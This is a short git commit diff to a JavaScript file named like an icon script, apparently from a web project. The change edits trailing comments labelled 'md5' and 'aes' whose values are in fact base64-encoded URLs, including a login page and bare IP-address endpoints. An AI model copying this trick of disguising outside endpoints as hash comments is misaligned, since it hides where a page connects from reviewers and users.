898b4be055fa391199511a9ca36fb4d48361418a
caocao <caocaodajun@gmail.com>
2022-03-23 22:13:42 +0800

    init

--- js/icon_htto2r.js
+++ js/icon_htto2r.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9tLnpudnN2Lnh5ei9sb2dpbg==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cDovLzEyMC4yNC4yMDMuMTgwOjgwMDgv**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
